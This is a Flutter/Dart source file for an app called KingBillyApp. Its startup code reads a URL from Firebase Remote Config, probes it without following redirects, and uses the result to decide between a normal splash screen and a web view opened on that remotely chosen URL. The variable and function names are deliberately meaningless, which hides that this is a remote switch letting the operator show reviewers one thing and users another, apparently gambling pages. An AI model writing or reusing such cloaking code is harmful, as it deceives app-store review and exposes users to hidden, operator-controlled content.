import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:king/main.dart';

import '../features/splash/splash_screen.dart';
import 'global_navigator/global_navigator.dart';

class KingBillyApp extends StatefulWidget {
  const KingBillyApp({super.key});

  @override
  State<KingBillyApp> createState() => _KingBillyAppState();
}

String route = '';
Future<bool> njfksdfs() async {
  final njda = FirebaseRemoteConfig.instance;
  await njda.fetchAndActivate();
  asdasfs();
  String dsdfdsfgdg = njda.getString('take');
  String cdsfgsdx = njda.getString('takeok');
  if (!dsdfdsfgdg.contains('noth')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      route = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('noth') ? false : true;
}

Future<void> getTrack() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

class _KingBillyAppState extends State<KingBillyApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
        future: njfksdfs(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
              child: Center(
                child: Container(
                  height: 70,
                  width: 70,
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(15),
                    child: Image.asset('assets/images/icon.png'),
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && route != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: Scnren(
                  njfkds: route,
                  njfkads: apsss,
                  mkda: cancelation,
                ),
              );
            } else {
              return const SplashScreen();
            }
          }
        },
      ),
      theme: ThemeData(
        useMaterial3: true,
        scaffoldBackgroundColor: const Color(0xff090907),
      ),
    );
  }
}
